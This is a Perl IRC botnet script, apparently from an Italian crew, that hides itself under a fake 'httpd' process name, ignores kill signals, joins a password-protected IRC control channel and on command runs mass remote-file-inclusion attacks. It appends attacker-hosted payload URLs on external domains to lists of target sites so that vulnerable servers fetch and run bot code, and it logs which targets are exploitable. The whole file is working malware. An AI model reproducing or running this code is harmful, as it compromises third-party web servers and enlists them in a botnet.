#/usr/bin/perl -w
use HTTP::Request;
use LWP::UserAgent;
use IO::Socket::INET;

#use warnings;
#use diagnostics;
my $processo = "httpd -SascSL"; 
if (`ps aux` =~ /httpd -SascSL/){exit;}
my $exploitcounter = 80;

# ----> Configuration <---- #
$server = "irc.virtual.ns0.it";

$idphp = "http://www.farvater-okna.ru/images/user";
$idr = "http://www.farvater-okna.ru/images/rul";
$idt = "http://www.kohlhoff-online.de/dmdocuments/.ServInfo";

$nick = "t00l[lol-".int(rand(101))."]";
$channel = "#mafia.it";
$pwd= "r0x_Arg0_t34m";
# ----> E0F Configuration <---- #


$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';
$0="$processo"."\0"x16; 
my $pid=fork; 
exit if $pid; 
die "Problem with fork!: $!" unless defined($pid);
$irc = IO::Socket::INET->new(PeerAddr => $server,
PeerPort => 6667, 
Proto => 'tcp') or die "[-] Error: $!\n";
$irc->autoflush(1); 
print $irc "NICK $nick\r\n";
print $irc "USER sf-crew 8 * :sf-crew\n";
print $irc "JOIN $channel $pwd\r\n";
#print $irc "JOIN #proxy\r\n";
while ($line = <$irc>) {
	print $line;
	if ($line =~ /^PING \:(.*)/) {
		print $irc "PONG :$1"; 
	}
	
	if ($line =~ /\:Current Local Users\:/) {
		print $irc "JOIN $channel $pwd\r\n";
	}
	
	if($line =~ m/^\:(.+?)\!(.+?)\@(.+?) JOIN \:(.+)/)  {
		$nick   = $1;
		$ident  = $2;
		$host   = $3;
		$chan = $4;
		
		#parse($nick, $ident, $host, $target, $msg);
	}
	if ($line =~ /\:!help/) {
		st_irc("SF Scanbot, cmd:\n");
		st_irc("9[3+9] !bnet risale pbot.");
		st_irc("9[3+9] !brul risale rulez.");
		st_irc("9[3+9] !btest testa i risultati.");
		st_irc("Have fun!");
	}	
	if($line =~ /\!exit/){
		exit(0);
	}
	if ($line =~ /:!bnet.*/) {
		if (my $pid = fork) { 
			waitpid($pid, 0); 
		} else { 
			if (fork) { 
				exit; 
			} else { 
				st_irc("Rejoin Bnet Avviato.");
				rejoin($idphp,".gs");
				st_irc("Rejoin Bnet Terminato.");

			}
		}
		
	}
	if ($line =~ /:!brul.*/) {
		if (my $pid = fork) { 
			waitpid($pid, 0); 
		} else { 
			if (fork) { 
				exit; 
			} else { 
				st_irc("Rejoin Brul Avviato.");
				rejoin($idr,".gn");
				st_irc("Rejoin Brul Terminato.");

			}
		}
	}
	if ($line =~ /:!btest.*/) {
		if (my $pid = fork) { 
			waitpid($pid, 0); 
		} else { 
			if (fork) { 
				exit; 
			} else { 
				st_irc("Testing Avviato.");
				Test();
				st_irc("Testing Terminato.");

			}
		}
	}	
}

sub st_irc {
	$msg = shift;
	print $irc "PRIVMSG $channel :$msg\r\n";
}

sub Test(){
	my $counter = 0;
	my @links = &GetLink("sess_09");
	my @forks;
	my $forked++;
	my @uni = &Unique(@links);
	my $testx = scalar(@uni);
	my $startx = 0;
	foreach my $site (@uni){
		$counter++;
		my $link = $site.$idt."???";
#		print "$link \n"; # Prints test links in terminal
		if($counter %$exploitcounter == 0){
			my $start = 0;
			foreach my $f(@forks){
				waitpid($f,0);
				$forks[$start--];
				$start++;
			}
			$startx = 0;
		}
		$forks[$startx]=fork();
		if($forks[$startx] == 0){
			my $htmlsite = &Query($link,"3");
			if($htmlsite =~ /xScaNx/ && $htmlsite =~ /uid=/){
#				st_irc("Safe OFF: $site");
				scrivi($site,".gn");
			}
			elsif($htmlsite =~ /xScaNx/){
#				st_irc("Safe ON: $site");
				scrivi($site,".gs");
			}
			exit(0);
		}
		if($counter %50 == 0){
			st_irc("Exploito 14 ".$counter." di ".$testx);
		}
		$startx++;
	}
	my $start = 0;
	foreach my $f(@forks){
		waitpid($f,0);
		$forks[$start--];
		$start++;
	}
}

sub GetLink(){
	my @file = shift;
	my $link;
	my @total;
	foreach my $n (@file){
		open(F,'<',$n);
		while($link = <F>){
			$link=~s/[\r\n]//g;
			push(@total,$link);
		}
		close(F);
	}
	return(@total);
}

sub Unique{
	my @Unique = ();
	my %seen = ();
	foreach my $element ( @_ ){
		next if $seen{ $element }++;
		push @Unique, $element;
	}
	return @Unique;
}

sub Query(){
	my($link,$timeout)=@_;
	my $req=HTTP::Request->new(GET=>$link);
	my $ua=LWP::UserAgent->new();
	$ua->agent($User_Agent[rand(scalar(@User_Agent))]);
	$ua->timeout($timeout);
	my $response=$ua->request($req);
	return $response->content;
}

sub rejoin {
	my($id,$fil)=@_;
	my $counter = 0;
	my @links = &GetLink($fil);
	my @forks;
	my $forked++;
	my @uni = &Unique(@links);
	my $testx = scalar(@uni);
	my $startx = 0;
	foreach my $site (@uni){
		$counter++;
		my $link = $site.$id."???";
		print "$link \n"; # Prints test links in terminal
		if($counter %$exploitcounter == 0){
			my $start = 0;
			foreach my $f(@forks){
				waitpid($f,0);
				$forks[$start--];
				$start++;
			}
			$startx = 0;
		}
		$forks[$startx]=fork();
		if($forks[$startx] == 0){
			&Query($link,"3");
			exit(0);
		}
		if($counter %50 == 0){
			st_irc("Exploito 14 ".$counter." di ".$testx);
		}
		$startx++;
	}
	my $start = 0;
	foreach my $f(@forks){
		waitpid($f,0);
		$forks[$start--];
		$start++;
	}
}
sub scrivi(){
	my($linkex,$fil)=@_;
	open VULN, ">>", "$fil";
	print VULN $linkex."\n";
	close VULN;	
}